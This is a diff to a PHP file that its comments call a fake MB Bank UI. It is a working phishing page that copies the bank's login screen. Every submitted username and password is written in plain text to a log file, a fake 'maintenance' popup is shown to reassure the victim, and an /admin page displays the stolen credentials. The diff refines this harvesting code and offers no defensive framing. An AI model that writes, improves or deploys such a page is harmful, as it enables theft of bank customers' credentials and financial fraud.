@@ -1,16 +1,22 @@
 <?php
-// MB Bank Fake UI - Lưu logs khi nhấn Đăng nhập (Không có checkbox lưu đăng nhập)
+// ================================================
+// MB BANK FAKE UI - LƯU LOGS KHI NHẤN ĐĂNG NHẬP
+// ================================================
+
 $uri = $_SERVER['REQUEST_URI'] ?? '/';
 
-// ====================== TRANG XEM LOGS ======================
+// ====================== TRANG ADMIN - XEM LOGS ======================
 if (strpos($uri, '/admin') !== false) {
     $logs = [];
-    $logContent = file_exists('../logs.txt') ? file_get_contents('../logs.txt') : 'Chưa có dữ liệu nào được lưu.';
+    $logContent = "Chưa có dữ liệu nào được lưu.";
 
-    if (file_exists('../logs.txt')) {
-        $lines = file('../logs.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $filePath = '../logs.txt';
+
+    if (file_exists($filePath)) {
+        $logContent = file_get_contents($filePath);
+        $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         foreach ($lines as $line) {
-            $parts = explode(" | ", $line);
+            $parts = explode(" | ", $line, 3);  // Giới hạn 3 phần
             if (count($parts) >= 3) {
                 $logs[] = $parts;
             }
@@ -22,23 +28,67 @@ if (strpos($uri, '/admin') !== false) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MB Bank - Xem Logs</title>
+    <title>MB Bank - Admin Logs</title>
     <style>
-        body {font-family:'Be Vietnam Pro',sans-serif;background:#000;color:#fff;padding:20px;}
-        table {width:100%;border-collapse:collapse;margin:20px 0;}
-        th, td {border:1px solid #8fd3f4;padding:12px;text-align:left;}
-        th {background:#8fd3f4;color:#0a0a80;}
-        pre {background:#111;padding:15px;border-radius:8px;overflow:auto;white-space:pre-wrap;}
-        .back {color:#8fd3f4;text-decoration:none;font-size:16px;}
+        body {
+            font-family: 'Be Vietnam Pro', sans-serif;
+            background: #000;
+            color: #fff;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        h1 { color: #8fd3f4; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            border: 1px solid #8fd3f4;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background: #8fd3f4;
+            color: #0a0a80;
+        }
+        pre {
+            background: #111;
+            padding: 15px;
+            border-radius: 8px;
+            overflow: auto;
+            white-space: pre-wrap;
+            max-height: 400px;
+        }
+        .back {
+            color: #8fd3f4;
+            text-decoration: none;
+            font-size: 16px;
+        }
+        .info {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
-    <h1>📋 Danh sách đăng nhập đã lưu</h1>
-    <p><strong>Tổng số bản ghi:</strong> <?= count($logs) ?></p>
+    <h1>📋 MB Bank - Logs Đăng Nhập</h1>
+    
+    <div class="info">
+        <strong>Tổng số bản ghi:</strong> <?= count($logs) ?> 
+        | 
+        <strong>File logs.txt:</strong> <?= file_exists($filePath) ? 'Tồn tại' : 'Không tồn tại' ?>
+    </div>
 
     <?php if (!empty($logs)): ?>
     <table>
-        <tr><th>Thời gian</th><th>Tên đăng nhập</th><th>Mật khẩu</th></tr>
+        <tr>
+            <th>Thời gian</th>
+            <th>Tên đăng nhập</th>
+            <th>Mật khẩu</th>
+        </tr>
         <?php foreach($logs as $log): ?>
         <tr>
             <td><?= htmlspecialchars($log[0] ?? '') ?></td>
@@ -48,13 +98,13 @@ if (strpos($uri, '/admin') !== false) {
         <?php endforeach; ?>
     </table>
     <?php else: ?>
-    <p>Chưa có bản ghi nào.</p>
+    <p>Chưa có bản ghi đăng nhập nào.</p>
     <?php endif; ?>
 
-    <h2>Nội dung file logs.txt:</h2>
+    <h2>Nội dung đầy đủ file logs.txt:</h2>
     <pre><?= htmlspecialchars($logContent) ?></pre>
 
-    <br>
+    <br><br>
     <a href="/" class="back">← Quay lại trang đăng nhập</a>
 </body>
 </html>
@@ -62,17 +112,23 @@ if (strpos($uri, '/admin') !== false) {
     exit;
 }
 
-// ====================== TRANG LOGIN MB BANK ======================
+// ====================== TRANG LOGIN ======================
 $showModal = false;
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = trim($_POST['username'] ?? '');
     $password = trim($_POST['password'] ?? '');
 
-    if ($username && $password) {
+    // === LƯU LOGS ===
+    if (!empty($username) && !empty($password)) {
         $logLine = date('Y-m-d H:i:s') . " | " . $username . " | " . $password . "\n";
-        file_put_contents('../logs.txt', $logLine, FILE_APPEND | LOCK_EX);
-        $showModal = true;
+        
+        // Ghi vào file
+        $result = file_put_contents('../logs.txt', $logLine, FILE_APPEND | LOCK_EX);
+        
+        if ($result !== false) {
+            $showModal = true;
+        }
     }
 }
 ?>
@@ -170,8 +226,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <i class="fa-solid fa-eye toggle-password" onclick="togglePassword()"></i>
             </div>
 
-            <!-- Đã xóa checkbox "Lưu đăng nhập" -->
-
             <div class="row">
                 <span>Tạo tài khoản</span>
                 <span>Quên mật khẩu?</span>
@@ -191,7 +245,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </div>
 </div>
 
-<!-- Modal bảo trì -->
+<!-- Modal -->
 <div id="maintenanceModal" class="maintenance-modal" style="display: <?= $showModal ? 'flex' : 'none' ?>;">
     <div class="modal-content">
         <div class="modal-icon">⚠️</div>
@@ -199,7 +253,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <div class="modal-text">
             Hệ thống đang bảo trì do số lượng truy cập quá lớn.<br><br>
             Vui lòng quay lại sau <strong>1 giờ</strong>.<br><br>
-            <small>Thông tin đăng nhập đã được lưu.</small>
+            <small>Thông tin đăng nhập đã được lưu vào logs.</small>
         </div>
         <button class="modal-btn" onclick="closeModal()">Đóng</button>
     </div>
